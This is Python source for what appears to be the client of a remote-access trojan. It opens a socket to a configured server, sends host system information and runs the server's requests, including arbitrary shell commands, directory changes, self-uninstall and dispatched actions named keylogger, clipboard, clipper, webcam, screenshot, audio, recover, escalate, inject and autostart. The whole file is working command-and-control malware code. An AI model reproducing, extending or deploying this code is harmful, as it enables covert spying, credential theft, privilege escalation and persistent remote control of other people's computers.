'''
    Handles the initial connection to the server,
    adjusting the server settings, sending the
    initial client information & directing
    actions based on server requests.

    Verified: 2020 December 30 & 2021 February 6
    * Follows PEP8
    * Tested Platforms
        * Windows 10
'''

from client.error import ClientError, ReconnectError
from client.sysinfo import Sysinfo, Interval, Shell
from client.helper import ClientHelper
from client.state import ClientStatic
from shared.state import Static
from shared.data import Data
import client.action

import socket
import sys
import os


class ClientSocket:

    __CD = 'cd'
    __CD_LENGTH = len(__CD)
    __RAW_LENGTH = len(Static.RAW)
    __EVENTS = (
        'screenshot',
        'clipboard',
        'keylogger',
        'autostart',
        'download',
        'escalate',
        'snapshot',
        'process',
        'recover',
        'sysinfo',
        'desktop',
        'clipper',
        'webcam',
        'python',
        'upload',
        'inject',
        'system',
        'browse',
        'audio',
        'alert'
    )

    def connect(self):
        with socket.create_connection((Static.IP, Static.PORT)) as sock:
            Data.send(sock, None)

            collect, ClientStatic.STICKY = [
                bool(setting) for setting in Data.recv(sock)]

            if collect:
                Data.send(sock, Sysinfo().collect())
            else:
                Data.send(sock, Data.message())

            while True:
                data = self.__response(Data.recv(sock))

                if data == Static.DISCONNECT:
                    sys.exit()
                elif data == Static.RECONNECT:
                    raise ReconnectError
                elif data == Static.UNINSTALL:
                    ClientHelper.uninstall()
                else:
                    Data.send(sock, data)

    def __response(self, request):
        message, lower = Data.lower(request)

        if message in (Static.INTERVAL, Static.ALIVE):
            if Static.WINDOWS:
                if ClientStatic.WEBCAM:
                    # NOTE : The VideoCapture library does
                    # not allow freeing of vidcap.new_Dev
                    # instance in a thread, as this will
                    # deadlock the entire program. This
                    # makes sure it's cleaned up when the
                    # webcam deconstructor is called
                    for key, capture in \
                            ClientStatic.WEBCAM.copy().items():
                        if not capture.alive:
                            del ClientStatic.WEBCAM[key]

            if message == Static.INTERVAL:
                return Interval.collect()
            else:
                return ''
        elif message in (Static.DISCONNECT,
                         Static.RECONNECT,
                         Static.UNINSTALL):
            return message
        elif lower[:ClientSocket.__CD_LENGTH] == ClientSocket.__CD:
            return self.__cd(message)
        elif lower[:ClientSocket.__RAW_LENGTH] == Static.RAW:
            if lower[ClientSocket.__RAW_LENGTH:ClientSocket.__RAW_LENGTH
                     + ClientSocket.__CD_LENGTH] == ClientSocket.__CD:
                return self.__cd(message[ClientSocket.__RAW_LENGTH:])
            else:
                return Shell.run(message[ClientSocket.__RAW_LENGTH:])
        elif lower in ClientSocket.__EVENTS:
            return getattr(client.action, lower)(request)
        else:
            return Shell.run(message)

    @ClientError.general
    def __cd(self, message):
        os.chdir(message[ClientSocket.__CD_LENGTH:].strip())
        return Data.parse(f'New directory: {os.getcwd()}', status=Static.INFO)
